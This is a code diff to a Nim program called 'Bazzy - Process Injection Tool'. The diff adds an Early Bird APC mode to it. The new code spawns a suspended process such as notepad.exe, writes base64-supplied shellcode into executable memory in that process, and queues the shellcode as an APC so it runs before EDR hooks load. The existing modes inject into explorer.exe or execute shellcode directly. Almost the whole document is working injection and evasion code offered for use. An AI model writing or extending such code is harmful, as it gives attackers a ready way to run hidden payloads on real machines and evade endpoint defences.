@@ -2,14 +2,15 @@ import base64, strutils, strformat, os
 import parseopt
 import createSuspendedProcess
 import winim/inc/tlhelp32  # Full import for process enumeration
-from winim/lean import OpenProcess, VirtualAllocEx, WriteProcessMemory, 
+from winim/lean import OpenProcess, VirtualAllocEx, WriteProcessMemory,
                       CreateRemoteThread, WaitForSingleObject, VirtualAlloc,
                       EnumSystemGeoID, CloseHandle, HANDLE, DWORD, INVALID_HANDLE_VALUE,
                       SIZE_T, LPTHREAD_START_ROUTINE, PAGE_EXECUTE_READWRITE,
                       MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
                       PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ,
                       PROCESS_CREATE_THREAD, GEO_ENUMPROC, PAGE_EXECUTE_READ_WRITE,
-                      WAIT_OBJECT_0, WAIT_TIMEOUT, GetLastError, VirtualFreeEx
+                      WAIT_OBJECT_0, WAIT_TIMEOUT, GetLastError, VirtualFreeEx,
+                      QueueUserAPC, PAPCFUNC, ULONG_PTR
 proc getExplorerPID(): DWORD =
   var 
     processEntry: PROCESSENTRY32W
@@ -153,6 +154,58 @@ proc executeShellcode(shellcode: openarray[byte]): void =
         0,
         cast[GEO_ENUMPROC](rPtr)
     )
+
+proc apcInject(shellcode: openarray[byte], hProcess: HANDLE, hThread: HANDLE): bool =
+    # Early Bird APC: queue the shellcode as an APC against the primary thread
+    # of a suspended process. When ResumeThread runs, NtTestAlert fires during
+    # process init and executes the APC before most user-mode EDR hooks load.
+    echo ".oO allocating APC payload memory Oo."
+
+    let size = cast[SIZE_T]((shellcode.len + 0xFFF) and not 0xFFF)
+    let memAddress = VirtualAllocEx(
+        hProcess,
+        nil,
+        size,
+        MEM_COMMIT or MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    )
+
+    if memAddress == nil:
+        echo "Failed to allocate memory in target process. Error: ", GetLastError()
+        return false
+
+    echo ".oO writing shellcode Oo."
+    var bytesWritten: SIZE_T
+    let writeResult = WriteProcessMemory(
+        hProcess,
+        memAddress,
+        unsafeAddr shellcode[0],
+        cast[SIZE_T](shellcode.len),
+        addr bytesWritten
+    )
+
+    if writeResult == 0:
+        echo "Failed to write shellcode into target process. Error: ", GetLastError()
+        VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
+        return false
+
+    echo "Wrote ", bytesWritten, " bytes of ", shellcode.len, " total bytes"
+
+    echo ".oO queueing early bird APC on suspended thread Oo."
+    let apcResult = QueueUserAPC(
+        cast[PAPCFUNC](memAddress),
+        hThread,
+        cast[ULONG_PTR](0)
+    )
+
+    if apcResult == 0:
+        echo "Failed to queue APC. Error: ", GetLastError()
+        VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
+        return false
+
+    echo "APC queued. Resume will fire NtTestAlert and execute shellcode."
+    return true
+
 proc showHelp() =
     echo """
 Bazzy - Process Injection Tool
@@ -165,19 +218,24 @@ Options:
     -p, --payload <base64>    Base64 encoded shellcode payload
     -t, --target <process>    Target process name to spawn from System32
     -e, --execute             Execute shellcode directly (no process injection)
-    
+    -a, --apc                 Early Bird APC injection into suspended target
+                              (uses -t target, defaults to notepad.exe)
+
 Examples:
     bazzy --payload <base64string>                 # Inject into explorer.exe
     bazzy -p <base64string> -t notepad.exe        # Inject into suspended notepad.exe
     bazzy -p <base64string> -e                    # Execute shellcode directly
+    bazzy -p <base64string> -a                    # Early Bird APC into suspended notepad.exe
+    bazzy -p <base64string> -a -t calc.exe        # Early Bird APC into suspended calc.exe
     """
     quit(0)
 
 # Main execution
-var 
+var
     payload = ""
     targetProcess = ""
     executeMode = false
+    apcMode = false
     processId: DWORD
     procHandle: HANDLE
     threadHandle: HANDLE
@@ -206,6 +264,8 @@ while true:
             targetProcess = p.key
         of "execute", "e":
             executeMode = true
+        of "apc", "a":
+            apcMode = true
     of cmdArgument:
         echo "Unknown argument: ", p.key
         showHelp()
@@ -241,6 +301,31 @@ copyMem(addr buf[0], unsafeAddr decodedData[0], decodedData.len)
 if executeMode:
     echo ".oO Executing shellcode directly Oo."
     executeShellcode(buf)
+elif apcMode:
+    # Early Bird APC requires a suspended target — default to notepad.exe
+    if targetProcess == "":
+        targetProcess = "notepad.exe"
+    echo ".oO Early Bird APC mode — spawning suspended target Oo."
+    let csp = createSuspendedProcess(
+        targetProcess,
+        addr processId,
+        addr procHandle,
+        addr threadHandle
+    )
+
+    if csp:
+        echo fmt"""
+            Process Details:
+            ---------------
+            PID: {processId}
+            Process Handle: {procHandle}
+            Thread Handle: {threadHandle}
+            """
+        if apcInject(buf, procHandle, threadHandle):
+            echo ".oO Resuming thread — APC fires now Oo."
+            discard resumeThread(threadHandle)
+        else:
+            echo "[!] APC injection failed; suspended process will exit when bazzy closes"
 elif targetProcess != "":
     # Use suspended process injection
     let csp = createSuspendedProcess(
